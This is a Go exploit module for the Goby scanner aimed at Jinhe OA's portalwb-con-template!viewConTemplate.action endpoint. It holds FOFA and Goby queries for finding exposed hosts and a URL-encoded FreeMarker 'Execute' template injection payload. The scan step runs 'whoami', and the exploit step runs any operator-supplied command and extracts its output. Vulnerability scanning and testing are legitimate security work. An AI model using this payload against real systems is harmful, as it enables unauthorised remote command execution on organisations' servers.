package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jinhe OA portalwb-con-template!viewConTemplate.action is vulnerable to template injection",
    "Description": "<p>The Jinhe Digital Intelligent Office Platform (referred to as JC6) is a digital office platform that integrates artificial intelligence technology, providing enterprises with intelligent office experiences and comprehensive support for digital transformation. It complies with national Xinchuang certification standards and supports organizational digital transformation, enabling the digitalization, intelligence, and collaboration of business processes to enhance enterprise competitiveness.</p><p>The \"portalwb-con-template!viewConTemplate.action\" interface in Jinhe OA is vulnerable to template injection, allowing attackers to execute system commands.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2024-03-11",
    "PostTime": "2024-03-14",
    "Author": "2783712916@qq.com",
    "FofaQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || body=\"href=\\\"/jc6/platform/\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\")) ",
    "GobyQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || body=\"href=\\\"/jc6/platform/\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\")) ",
    "Level": "3",
    "Impact": "<p>The \"portalwb-con-template!viewConTemplate.action\" interface in Jinhe OA is vulnerable to template injection, allowing attackers to execute system commands.</p>",
    "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "150"
                },
                "data_type": "text",
                "data": "moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522whoami%2522%29%257D%253C%252Fclob%253E&uuid=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<clob>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "150"
                },
                "data_type": "text",
                "data": "moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522{{{cmd}}}%2522%29%257D%253C%252Fclob%253E&uuid=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<clob>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "template error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<clob>([^<]+)<\\/clob>"
            ]
        }
    ],
    "Tags": [
        "Code Execution",
        "HW-2023"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "金和OA portalwb-con-template!viewConTemplate.action 模板注入漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和数字化智能办公平台（简称JC6）是一款结合了人工智能技术的数字化办公平台，为企业带来了智能化的办公体验和全面的数字化转型支持。同时符合国家信创认证标准，支持组织数字化转型，实现业务流程的数字化、智能化和协同化，提高企业竞争力。<br></p><p>金和OA portalwb-con-template!viewConTemplate.action接口存在模板注入漏洞，攻击者可利用该漏洞执行系统命令。</p>",
            "Recommendation": "<p>1.联系相关厂商，获取安全补丁，及时进行漏洞修复</p><p>2.联系相关安全厂商，及时更新安全阻断策略</p>",
            "Impact": "<p>金和OA portalwb-con-template!viewConTemplate.action接口存在模板注入漏洞，攻击者可利用该漏洞执行系统命令。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Jinhe OA portalwb-con-template!viewConTemplate.action is vulnerable to template injection",
            "Product": "Jinher-OA",
            "Description": "<p>The Jinhe Digital Intelligent Office Platform (referred to as JC6) is a digital office platform that integrates artificial intelligence technology, providing enterprises with intelligent office experiences and comprehensive support for digital transformation. It complies with national Xinchuang certification standards and supports organizational digital transformation, enabling the digitalization, intelligence, and collaboration of business processes to enhance enterprise competitiveness.<br></p><p>The \"portalwb-con-template!viewConTemplate.action\" interface in Jinhe OA is vulnerable to template injection, allowing attackers to execute system commands.<br></p>",
            "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
            "Impact": "<p>The \"portalwb-con-template!viewConTemplate.action\" interface in Jinhe OA is vulnerable to template injection, allowing attackers to execute system commands.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
